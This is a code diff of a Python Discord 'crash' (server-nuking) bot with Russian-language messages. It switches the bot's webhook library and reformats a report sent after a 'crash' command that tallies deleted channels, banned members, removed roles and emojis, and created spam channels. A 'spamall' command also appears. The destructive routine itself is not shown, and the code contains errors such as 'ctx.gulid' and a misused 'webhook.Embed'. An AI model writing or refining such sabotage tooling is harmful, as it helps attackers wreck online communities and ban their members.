@@ -2,16 +2,17 @@ import discord
 import datetime
 import random
 import asyncio
+import dhooks
 
 from discord.ext import commands
 from config import settings
-from discord import Webhook, RequestsWebhookAdapter
+from dhooks import Webhook, Embed
 
 client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
 client.remove_command('help')
 
 global webhook
-webhook = Webhook.from_url(settings['WEBHOOK'], adapter=RequestsWebhookAdapter())
+webhook = Webhook(settings['WEBHOOK'])
 
 
 def localtime():
@@ -123,23 +124,24 @@ async def crash(ctx):
 	await asyncio.sleep(2)
 	#CRASH REPORT
 	try:
-		emb = discord.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {start_guild_num}\n\
+		emb = webhook.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {start_guild_num}\n\
 		**Удалено:**\n\
-			**Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
-			**Людей забанено:** {banned_num}/{start_guild_num}\n\
-			**Эмодзи удалено:** {deleted_emojis}/{start_guild_emoji_num}\n\
-			**Ролей:** {deleted_roles}/{start_guild_role_num}\n\n\
+		 **Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
+		 **Людей забанено:** {banned_num}/{start_guild_num}\n\
+		 **Эмодзи удалено:** {deleted_emojis}/{start_guild_emoji_num}\n\
+		 **Ролей:** {deleted_roles}/{start_guild_role_num}\n\n\
 		**Изменено:**\n\
-			**Создано:**\n\
-			**Текстовых каналов:** {text_num}/{settings['TEXT-CHANNELS']}\n\
-			**Голосовых:** {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
+		 **Создано:**\n\
+		  **Текстовых каналов:** {text_num}/{settings['TEXT-CHANNELS']}\n\
+		  **Голосовых:** {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
 		**Другое**\n\
-			**Создано ролей:** {roles_num}/{settings['ROLES']}\n\
-			**Эмодзи создано:** {emojis_num}/{settings['EMOJI']}\n\
-			**Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
+		 **Создано ролей:** {roles_num}/{settings['ROLES']}\n\
+		 **Эмодзи создано:** {emojis_num}/{settings['EMOJI']}\n\
+		 **Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
 		**Начало краша:** {start_time}\n\
-		**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337)
-		emb.set_thumbnail(url = servericon)
+		**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
+		emb.set_thumbnail(servericon)
+		emb.set_footer('Сервер крашнут:')
 		webhook.send(embed = emb, username = 'Краш-бот')
 		print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
 	except:
@@ -156,8 +158,7 @@ async def __spam(ctx):
 @client.command()
 async def webhtest(ctx):
 	servername = ctx.gulid.name
-	emb = discord.Embed(title = 'Тестовое сообщение', description = f"123 {servername} a", color = 0xe01337)
-	emb.set_thumbnail(url = servericon)
+	emb = webhook.Embed(title = 'Тестовое сообщение', description = f"123 {servername} a", color = 0xe01337)
 	webhook.send(embed = emb, username = 'Краш-бот')
 
 @client.command(aliases=['spamall'])
